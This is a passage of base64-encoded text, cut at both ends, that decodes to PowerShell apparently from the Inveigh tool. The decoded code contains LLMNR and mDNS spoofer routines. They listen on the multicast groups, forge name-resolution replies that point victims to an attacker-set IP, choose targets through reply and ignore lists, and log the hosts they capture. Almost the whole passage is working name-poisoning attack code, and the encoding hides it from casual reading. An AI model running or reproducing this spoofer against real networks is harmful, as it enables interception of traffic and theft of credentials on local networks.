gICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBzd2l0Y2goJGVuZHBvaW50X3NvdXJjZV9wb3J0KQogICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICA1MzU1ICMgTExNTlIgUmVzcG9uc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTcG9vZmVyTGVhcm5pbmcgLWVxICdZJyAtYW5kICRMTE1OUl9sZWFybmluZ19sb2cuRXhpc3RzKHtwYXJhbSgkcykgJHMgLWxpa2UgIiogIiArIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbMC4uMV0pICsgIiAqIn0pKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfcXVlcnkgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRwYXlsb2FkX2J5dGVzWzEzLi4oJHBheWxvYWRfYnl0ZXNbMTJdICsgMTMpXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9xdWVyeSA9ICRMTE1OUl9xdWVyeSAtcmVwbGFjZSAiLTAwIiwiIgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRMTE1OUl9xdWVyeS5MZW5ndGggLWVxIDIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3F1ZXJ5ID0gW0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkTExNTlJfcXVlcnksMTYpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3F1ZXJ5X3N0cmluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZygkTExNTlJfcXVlcnkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3F1ZXJ5ID0gJExMTU5SX3F1ZXJ5LlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfcXVlcnlfc3RyaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyaW5nKCRMTE1OUl9xdWVyeSwwLCRMTE1OUl9xdWVyeS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJExMTU5SX3Jlc3BvbnNlX0lQX2J5dGVzID0gJHBheWxvYWRfYnl0ZXNbKCRwYXlsb2FkX2J5dGVzLkxlbmd0aCAtIDQpLi4oJHBheWxvYWRfYnl0ZXMuTGVuZ3RoKV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9JUCA9IFtTeXN0ZW0uTmV0LklQQWRkcmVzc10kTExNTlJfcmVzcG9uc2VfSVBfYnl0ZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9JUCA9ICRMTE1OUl9yZXNwb25zZV9JUC5JUEFkZHJlc3NUb1N0cmluZwogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC52YWxpZF9ob3N0X2xpc3QgLW5vdGNvbnRhaW5zICRMTE1OUl9xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gudmFsaWRfaG9zdF9saXN0LkFkZCgkTExNTlJfcXVlcnlfc3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIExMTU5SIHJlc3BvbnNlICRMTE1OUl9yZXNwb25zZV9JUCBmb3IgJExMTU5SX3F1ZXJ5X3N0cmluZyByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgLSAkTExNTlJfcXVlcnlfc3RyaW5nIGFkZGVkIHRvIHZhbGlkIGhvc3QgbGlzdCIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIExMTU5SIHJlc3BvbnNlICRMTE1OUl9yZXNwb25zZV9JUCBmb3IgJExMTU5SX3F1ZXJ5X3N0cmluZyByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgLSAkTExNTlJfcXVlcnlfc3RyaW5nIGFkZGVkIHRvIHZhbGlkIGhvc3QgbGlzdCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBMTE1OUiByZXNwb25zZSAkTExNTlJfcmVzcG9uc2VfSVAgZm9yICRMTE1OUl9xdWVyeV9zdHJpbmcgcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQIC0gJExMTU5SX3F1ZXJ5X3N0cmluZyBhZGRlZCB0byB2YWxpZCBob3N0IGxpc3QiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgfQoKICAgICRiaW5hcnlfcmVhZGVyLkNsb3NlKCkKICAgICRtZW1vcnlfc3RyZWFtLkRpc3Bvc2UoKQogICAgJG1lbW9yeV9zdHJlYW0uQ2xvc2UoKQp9CgojIFVucHJpdmlsZWdlZCBMTE1OUiBTcG9vZmVyIFNjcmlwdEJsb2NrIAokTExNTlJfc3Bvb2Zlcl9zY3JpcHRibG9jayA9IAp7CiAgICBwYXJhbSAoJEluc3BlY3QsJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UsJFNwb29mZXJJUCwkU3Bvb2Zlckhvc3RzUmVwbHksJFNwb29mZXJIb3N0c0lnbm9yZSwkU3Bvb2ZlcklQc1JlcGx5LCRTcG9vZmVySVBzSWdub3JlLCRMTE1OUlRUTCkKCiAgICAkTExNTlJfcnVubmluZyA9ICR0cnVlCiAgICAkTExNTlJfbGlzdGVuZXJfZW5kcG9pbnQgPSBOZXctb2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludCAoW0lQQWRkcmVzc106OkFueSw1MzU1KQoKICAgIHRyeQogICAgewogICAgICAgICRMTE1OUl9VRFBfY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVWRwQ2xpZW50IDUzNTUKICAgIH0KICAgIGNhdGNoCiAgICB7CiAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gRXJyb3Igc3RhcnRpbmcgTExNTlIgc3Bvb2ZlciIpCiAgICAgICAgJExMTU5SX3J1bm5pbmcgPSAkZmFsc2UKCiAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gRXJyb3Igc3RhcnRpbmcgTExNTlIgc3Bvb2ZlciIpCiAgICAgICAgfQoKICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBFcnJvciBzdGFydGluZyBMTE1OUiBzcG9vZmVyIikKICAgICAgICB9CgogICAgfQoKICAgICRMTE1OUl9tdWx0aWNhc3RfZ3JvdXAgPSBbSVBBZGRyZXNzXSIyMjQuMC4wLjI1MiIKICAgICRMTE1OUl9VRFBfY2xpZW50LkpvaW5NdWx0aWNhc3RHcm91cCgkTExNTlJfbXVsdGljYXN0X2dyb3VwKQogICAgJExMTU5SX1VEUF9jbGllbnQuQ2xpZW50LlJlY2VpdmVUaW1lb3V0ID0gNTAwMAogICAgJExMTU5SX1RUTF9ieXRlcyA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJExMTU5SVFRMKQogICAgW0FycmF5XTo6UmV2ZXJzZSgkTExNTlJfVFRMX2J5dGVzKQoKICAgIHdoaWxlKCRpbnZlaWdoLnJ1bm5pbmcgLWFuZCAkTExNTlJfcnVubmluZykKICAgIHsgICAKCiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICAkTExNTlJfcmVxdWVzdF9kYXRhID0gJExMTU5SX1VEUF9jbGllbnQuUmVjZWl2ZShbUmVmXSRMTE1OUl9saXN0ZW5lcl9lbmRwb2ludCkKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgICRMTE1OUl9VRFBfY2xpZW50LkNsb3NlKCkKICAgICAgICAgICAgJExMTU5SX1VEUF9jbGllbnQgPSBuZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5VZHBDbGllbnQgNTM1NQogICAgICAgICAgICAkTExNTlJfbXVsdGljYXN0X2dyb3VwID0gW0lQQWRkcmVzc10iMjI0LjAuMC4yNTIiCiAgICAgICAgICAgICRMTE1OUl9VRFBfY2xpZW50LkpvaW5NdWx0aWNhc3RHcm91cCgkTExNTlJfbXVsdGljYXN0X2dyb3VwKQogICAgICAgICAgICAkTExNTlJfVURQX2NsaWVudC5DbGllbnQuUmVjZWl2ZVRpbWVvdXQgPSA1MDAwCiAgICAgICAgfQoKICAgICAgICBpZigkTExNTlJfcmVxdWVzdF9kYXRhIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkTExNTlJfcmVxdWVzdF9kYXRhWygkTExNTlJfcmVxdWVzdF9kYXRhLkxlbmd0aCAtIDQpLi4oJExMTU5SX3JlcXVlc3RfZGF0YS5MZW5ndGggLSAzKV0pIC1uZSAnMDAtMWMnKSAjIGlnbm9yZSBBQUFBIGZvciBub3cKICAgICAgICB7CgogICAgICAgICAgICAkTExNTlJfcmVzcG9uc2VfcGFja2V0ID0gJExMTU5SX3JlcXVlc3RfZGF0YVswLDFdICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ODAsMHgwMCwweDAwLDB4MDEsMHgwMCwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJExMTU5SX3JlcXVlc3RfZGF0YVsxMi4uJExMTU5SX3JlcXVlc3RfZGF0YS5MZW5ndGhdICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXF1ZXN0X2RhdGFbMTIuLiRMTE1OUl9yZXF1ZXN0X2RhdGEuTGVuZ3RoXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTExNTlJfVFRMX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwNCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoW1N5c3RlbS5OZXQuSVBBZGRyZXNzXVtTdHJpbmddKFtTeXN0ZW0uTmV0LklQQWRkcmVzc10kU3Bvb2ZlcklQKSkuR2V0QWRkcmVzc0J5dGVzKCkKICAgICAgICAKICAgICAgICAgICAgJExMTU5SX3F1ZXJ5X3N0cmluZyA9IFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJExMTU5SX3JlcXVlc3RfZGF0YVsxMy4uKCRMTE1OUl9yZXF1ZXN0X2RhdGFbMTJdICsgMTIpXSkgICAgIAogICAgICAgICAgICAkc291cmNlX0lQID0gJExMTU5SX2xpc3RlbmVyX2VuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcKCiAgICAgICAgICAgIGlmKCEkSW5zcGVjdCAtYW5kICgkTExNTlJfcmVxdWVzdF9kYXRhIC1hbmQgJExMTU5SX2xpc3RlbmVyX2VuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgLW5lICcwLjAuMC4wJykgLWFuZCAoISRTcG9vZmVySG9zdHNSZXBseSAtb3IgJFNwb29mZXJIb3N0c1JlcGx5IC1jb250YWlucyAkTExNTlJfcXVlcnlfc3RyaW5nKSAtYW5kICgKICAgICAgICAgICAgISRTcG9vZmVySG9zdHNJZ25vcmUgLW9yICRTcG9vZmVySG9zdHNJZ25vcmUgLW5vdGNvbnRhaW5zICRMTE1OUl9xdWVyeV9zdHJpbmcpIC1hbmQgKCEkU3Bvb2ZlcklQc1JlcGx5IC1vciAkU3Bvb2ZlcklQc1JlcGx5IC1jb250YWlucyAkc291cmNlX0lQKSAtYW5kICghJFNwb29mZXJJUHNJZ25vcmUgLW9yICRTcG9vZmVySVBzSWdub3JlIC1ub3Rjb250YWlucyAkc291cmNlX0lQKSAtYW5kICgKICAgICAgICAgICAgJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQgLW9yICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRMTE1OUl9kZXN0aW5hdGlvbl9lbmRwb2ludCA9IE5ldy1PYmplY3QgTmV0LklQRW5kcG9pbnQoJExMTU5SX2xpc3RlbmVyX2VuZHBvaW50LkFkZHJlc3MsJExMTU5SX2xpc3RlbmVyX2VuZHBvaW50LlBvcnQpCiAgICAgICAgICAgICAgICAkTExNTlJfVURQX2NsaWVudC5Db25uZWN0KCRMTE1OUl9kZXN0aW5hdGlvbl9lbmRwb2ludCkKICAgICAgICAgICAgICAgICRMTE1OUl9VRFBfY2xpZW50LlNlbmQoJExMTU5SX3Jlc3BvbnNlX3BhY2tldCwkTExNTlJfcmVzcG9uc2VfcGFja2V0Lkxlbmd0aCkKICAgICAgICAgICAgICAgICRMTE1OUl9VRFBfY2xpZW50LkNsb3NlKCkKICAgICAgICAgICAgICAgICRMTE1OUl9VRFBfY2xpZW50ID0gbmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVWRwQ2xpZW50IDUzNTUKICAgICAgICAgICAgICAgICRMTE1OUl9tdWx0aWNhc3RfZ3JvdXAgPSBbSVBBZGRyZXNzXSIyMjQuMC4wLjI1MiIKICAgICAgICAgICAgICAgICRMTE1OUl9VRFBfY2xpZW50LkpvaW5NdWx0aWNhc3RHcm91cCgkTExNTlJfbXVsdGljYXN0X2dyb3VwKQogICAgICAgICAgICAgICAgJExMTU5SX1VEUF9jbGllbnQuQ2xpZW50LlJlY2VpdmVUaW1lb3V0ID0gNTAwMAogICAgICAgICAgICAgICAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSByZXNwb25zZSBzZW50IgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIGlmKCRJbnNwZWN0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlID0gIi0gaW5zcGVjdCBvbmx5IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySG9zdHNSZXBseSAtYW5kICRTcG9vZmVySG9zdHNSZXBseSAtbm90Y29udGFpbnMgJExMTU5SX3F1ZXJ5X3N0cmluZykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTExNTlJfcmVzcG9uc2VfbWVzc2FnZSA9ICItICRMTE1OUl9xdWVyeV9zdHJpbmcgaXMgbm90IG9uIHJlcGx5IGxpc3QiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJIb3N0c0lnbm9yZSAtYW5kICRTcG9vZmVySG9zdHNJZ25vcmUgLWNvbnRhaW5zICRMTE1OUl9xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkTExNTlJfcXVlcnlfc3RyaW5nIGlzIG9uIGlnbm9yZSBsaXN0IgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySVBzUmVwbHkgLWFuZCAkU3Bvb2ZlcklQc1JlcGx5IC1ub3Rjb250YWlucyAkc291cmNlX0lQKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlID0gIi0gJHNvdXJjZV9JUCBpcyBub3Qgb24gcmVwbHkgbGlzdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2ZlcklQc0lnbm9yZSAtYW5kICRTcG9vZmVySVBzSWdub3JlIC1jb250YWlucyAkc291cmNlX0lQKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlID0gIi0gJHNvdXJjZV9JUCBpcyBvbiBpZ25vcmUgbGlzdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZigkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgLWNvbnRhaW5zICRzb3VyY2VfSVApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBwcmV2aW91cyBjYXB0dXJlIGZyb20gJHNvdXJjZV9JUCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkTExNTlJfcmVzcG9uc2VfbWVzc2FnZSA9ICItIHNvbWV0aGluZyB3ZW50IHdyb25nIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgICAgIGlmKCRMTE1OUl9yZXF1ZXN0X2RhdGEpICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBMTE1OUiByZXF1ZXN0IGZvciAkTExNTlJfcXVlcnlfc3RyaW5nIHJlY2VpdmVkIGZyb20gJHNvdXJjZV9JUCAkTExNTlJfcmVzcG9uc2VfbWVzc2FnZSIpCgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIExMTU5SIHJlcXVlc3QgZm9yICRMTE1OUl9xdWVyeV9zdHJpbmcgcmVjZWl2ZWQgZnJvbSAkc291cmNlX0lQICRMTE1OUl9yZXNwb25zZV9tZXNzYWdlIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTExNTlIgcmVxdWVzdCBmb3IgJExMTU5SX3F1ZXJ5X3N0cmluZyByZWNlaXZlZCBmcm9tICRzb3VyY2VfSVAgJExMTU5SX3Jlc3BvbnNlX21lc3NhZ2UiKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJExMTU5SX3JlcXVlc3RfZGF0YSA9ICIiCiAgICAgICAgfQoKICAgIH0KCiAgICAkTExNTlJfVURQX2NsaWVudC5DbG9zZSgpCiB9CgojIFVucHJpdmlsZWdlZCBtRE5TIFNwb29mZXIgU2NyaXB0QmxvY2sgCiRtRE5TX3Nwb29mZXJfc2NyaXB0YmxvY2sgPSAKewogICAgcGFyYW0gKCRJbnNwZWN0LCRtRE5TX3Jlc3BvbnNlX21lc3NhZ2UsJG1ETlNUVEwsJG1ETlNUeXBlcywkU3Bvb2ZlcklQLCRTcG9vZmVySG9zdHNSZXBseSwkU3Bvb2Zlckhvc3RzSWdub3JlLCRTcG9vZmVySVBzUmVwbHksJFNwb29mZXJJUHNJZ25vcmUpCgogICAgJG1ETlNfcnVubmluZyA9ICR0cnVlCiAgICAkbUROU19saXN0ZW5lcl9lbmRwb2ludCA9IE5ldy1vYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbSVBBZGRyZXNzXTo6QW55LDUzNTMpCgogICAgdHJ5CiAgICB7CiAgICAgICAgJG1ETlNfVURQX2NsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVkcENsaWVudCA1MzUzCiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEVycm9yIHN0YXJ0aW5nIG1ETlMgc3Bvb2ZlciIpCiAgICAgICAgJG1ETlNfcnVubmluZyA9ICRmYWxzZQoKICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBFcnJvciBzdGFydGluZyBtRE5TIHNwb29mZXIiKQogICAgICAgIH0KCiAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gRXJyb3Igc3RhcnRpbmcgbUROUyBzcG9vZmVyIikKICAgICAgICB9CgogICAgfQoKICAgICRtRE5TX211bHRpY2FzdF9ncm91cCA9IFtJUEFkZHJlc3NdIjIyNC4wLjAuMjUxIgogICAgJG1ETlNfVURQX2NsaWVudC5Kb2luTXVsdGljYXN0R3JvdXAoJG1ETlNfbXVsdGljYXN0X2dyb3VwKQogICAgJG1ETlNfVURQX2NsaWVudC5DbGllbnQuUmVjZWl2ZVRpbWVvdXQgPSA1MDAwCiAgICAkbUROU19UVExfYnl0ZXMgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRtRE5TVFRMKQogICAgW0FycmF5XTo6UmV2ZXJzZSgkbUROU19UVExfYnl0ZXMpCgogICAgd2hpbGUoJGludmVpZ2gucnVubmluZyAtYW5kICRtRE5TX3J1bm5pbmcpCiAgICB7ICAgCgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgJG1ETlNfcmVxdWVzdF9kYXRhID0gJG1ETlNfVURQX2NsaWVudC5SZWNlaXZlKFtSZWZdJG1ETlNfbGlzdGVuZXJfZW5kcG9pbnQpCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgICAkbUROU19VRFBfY2xpZW50LkNsb3NlKCkKICAgICAgICAgICAgJG1ETlNfVURQX2NsaWVudCA9IG5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVkcENsaWVudCA1MzUzCiAgICAgICAgICAgICRtRE5TX211bHRpY2FzdF9ncm91cCA9IFtJUEFkZHJlc3NdIjIyNC4wLjAuMjUxIgogICAgICAgICAgICAkbUROU19VRFBfY2xpZW50LkpvaW5NdWx0aWNhc3RHcm91cCgkbUROU19tdWx0aWNhc3RfZ3JvdXApCiAgICAgICAgICAgICRtRE5TX1VEUF9jbGllbnQuQ2xpZW50LlJlY2VpdmVUaW1lb3V0ID0gNTAwMAogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRtRE5TX3JlcXVlc3RfZGF0YSkgLWxpa2UgJyotMDAtMDEtODAtMDEnKQogICAgICAgIHsKICAgICAgICAgICAgJG1ETlNfcmVzcG9uc2VfcGFja2V0ID0gJG1ETlNfcmVxdWVzdF9kYXRhWzAsMV0gKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDg0LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1ETlNfcmVxdWVzdF9kYXRhWzEyLi4oJG1ETlNfcmVxdWVzdF9kYXRhLkxlbmd0aCAtIDUpXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMSwweDAwLDB4MDEgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbUROU19UVExfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDQgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoW1N5c3RlbS5OZXQuSVBBZGRyZXNzXVtTdHJpbmddKFtTeXN0ZW0uTmV0LklQQWRkcmVzc10kU3Bvb2ZlcklQKSkuR2V0QWRkcmVzc0J5dGVzKCkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICRtRE5TX3F1ZXJ5X3N0cmluZyA9IERhdGFUb1N0cmluZyAxMyAkbUROU19yZXF1ZXN0X2RhdGFbMTJdICRtRE5TX3JlcXVlc3RfZGF0YQogICAgICAgICAgICAkbUROU19xdWVyeV9zdHJpbmdfZnVsbCA9ICRtRE5TX3F1ZXJ5X3N0cmluZyArICIubG9jYWwiICAgCiAgICAgICAgICAgICRzb3VyY2VfSVAgPSAkbUROU19saXN0ZW5lcl9lbmRwb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nCgogICAgICAgICAgICBpZighJEluc3BlY3QgLWFuZCAoJG1ETlNfcmVxdWVzdF9kYXRhIC1hbmQgJG1ETlNfbGlzdGVuZXJfZW5kcG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZyAtbmUgJzAuMC4wLjAnKSAtYW5kICghJFNwb29mZXJIb3N0c1JlcGx5IC1vciAkU3Bvb2Zlckhvc3RzUmVwbHkgLWNvbnRhaW5zICRtRE5TX3F1ZXJ5X3N0cmluZykgLWFuZCAoCiAgICAgICAgICAgICEkU3Bvb2Zlckhvc3RzSWdub3JlIC1vciAkU3Bvb2Zlckhvc3RzSWdub3JlIC1ub3Rjb250YWlucyAkbUROU19xdWVyeV9zdHJpbmcpIC1hbmQgKCEkU3Bvb2ZlcklQc1JlcGx5IC1vciAkU3Bvb2ZlcklQc1JlcGx5IC1jb250YWlucyAkc291cmNlX0lQKSAtYW5kICghJFNwb29mZXJJUHNJZ25vcmUgLW9yICRTcG9vZmVySVBzSWdub3JlIC1ub3Rjb250YWlucyAkc291cmNlX0lQKSAtYW5kICgKICAgICAgICAgICAgJG1ETlNUeXBlcyAtY29udGFpbnMgJ1FVJykgLWFuZCAoJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQgLW9yICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRtRE5TX2Rlc3RpbmF0aW9uX2VuZHBvaW50ID0gTmV3LU9iamVjdCBOZXQuSVBFbmRwb2ludCgkbUROU19saXN0ZW5lcl9lbmRwb2ludC5BZGRyZXNzLCRtRE5TX2xpc3RlbmVyX2VuZHBvaW50LlBvcnQpCiAgICAgICAgICAgICAgICAkbUROU19VRFBfY2xpZW50LkNvbm5lY3QoJG1ETlNfZGVzdGluYXRpb25fZW5kcG9pbnQpCiAgICAgICAgICAgICAgICAkbUROU19VRFBfY2xpZW50LlNlbmQoJG1ETlNfcmVzcG9uc2VfcGF